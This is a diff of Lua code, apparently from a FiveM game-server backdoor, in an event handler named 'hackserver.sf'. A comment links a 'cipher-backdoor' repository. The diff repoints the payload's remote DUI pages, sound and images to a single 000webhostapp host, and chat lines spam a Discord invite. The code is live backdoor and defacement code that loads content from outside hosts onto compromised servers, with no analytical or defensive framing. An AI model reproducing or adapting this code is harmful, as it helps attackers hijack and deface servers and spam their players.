@@ -10485,14 +10485,14 @@ AddEventHandler("hackserver.sf", function()
 	   end
 	end)
 
-	local sound = CreateDui("https://cdn.discordapp.com/attachments/1013925204004700200/1014243522787954709/doxbin.mp3", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local sound = CreateDui("https://internetinkooleimmat.000webhostapp.com/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
 
 	local textureDic = CreateRuntimeTxd('duiTxd');
 
 	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
-	local object = CreateDui("https://internetinkooleimmat.000webhostapp.com/", 1920, 1080);
-	local object2 = CreateDui("https://spambude.net/Dks/html/lyxos_bug/lyxos_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
-	local object3 = CreateDui("https://cdn.discordapp.com/attachments/1013925204004700200/1014603105301692446/screen3_2.png", 1920, 1080);
+	local object = CreateDui("https://internetinkooleimmat.000webhostapp.com/y.html", 1920, 1080);
+	local object2 = CreateDui("https://internetinkooleimmat.000webhostapp.com/cipher_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
+	local object3 = CreateDui("https://internetinkooleimmat.000webhostapp.com/screen3_2.html", 1920, 1080);
 
 	local handle = GetDuiHandle(object) -- Gets DUI handle from object
 	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
@@ -10507,7 +10507,7 @@ AddEventHandler("hackserver.sf", function()
 	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex2", handle2) -- Creates the texture "duiTex" in the "duiTxd" dictionary
 	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex3", handle3) -- Creates the texture "duiTex" in the "duiTxd" dictionary
 
-	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
+	local chatColors = {{224, 50, 50, 255}, {0, 0, 0, 255}}
 	local texts = {
 	   "----> - https://dsc.gg/internetinkooleimmat",
 	   " ----> - https://dsc.gg/internetinkooleimmat",
